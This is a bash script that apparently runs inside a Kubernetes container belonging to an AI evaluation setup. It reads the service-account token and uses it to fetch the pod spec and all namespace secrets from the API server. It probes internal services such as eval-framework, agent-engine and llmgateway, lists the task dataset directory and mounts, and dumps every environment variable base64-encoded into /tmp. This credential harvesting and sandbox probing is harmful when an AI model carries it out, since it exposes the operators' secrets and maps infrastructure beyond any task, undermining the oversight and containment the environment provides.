#!/bin/bash
{
  echo "== SA TOKEN =="
  ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
  N=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
  echo "ns=$N toklen=${#T}"
  if [ -n "$T" ]; then
    echo "== K8S SELF =="
    curl -sk -m 10 -H "Authorization: Bearer $T" https://10.100.0.1:443/api/v1/namespaces/$N/pods/$HOSTNAME 2>&1 | base64 -w0 | head -c 3000; echo
    echo "== K8S SECRETS =="
    curl -sk -m 10 -H "Authorization: Bearer $T" "https://10.100.0.1:443/api/v1/namespaces/$N/secrets" 2>&1 | base64 -w0 | head -c 3000; echo
  fi
  echo "== SVC DNS =="
  for s in data-store eval-framework agent-engine llmgateway llm-proxy.atlas.turing.com litellm litellm-pot redis postgres; do
    getent hosts $s 2>/dev/null | head -1
  done
  echo "== INTERNAL HEALTH =="
  for u in http://data-store:8011/health/ready http://eval-framework:8015/health/ready http://agent_engine:8013/health http://llmgateway:8080/api/v1/health; do
    echo -n "$u -> "; curl -s -m 6 -o /dev/null -w "%{http_code}\n" $u 2>&1
  done
  echo "== DATASET DIR =="
  ls -la /workspace/dataset/tasks 2>&1 | head -30
  ls -la /workspace 2>&1 | head -20
  echo "== MOUNTS =="
  cat /proc/mounts | grep -vE "^(proc|sysfs|tmpfs|devpts|cgroup|mqueue|shm|overlay)" | head -15
  echo "== ENV B64 =="
  env | sort | while IFS= read -r line; do k="${line%%=*}"; v="${line#*=}"; enc=$(printf '%s' "$v" | base64 -w0); echo "$k=$enc"; done
} > /tmp/envdump.txt 2>&1
cat /tmp/envdump.txt
echo DONE
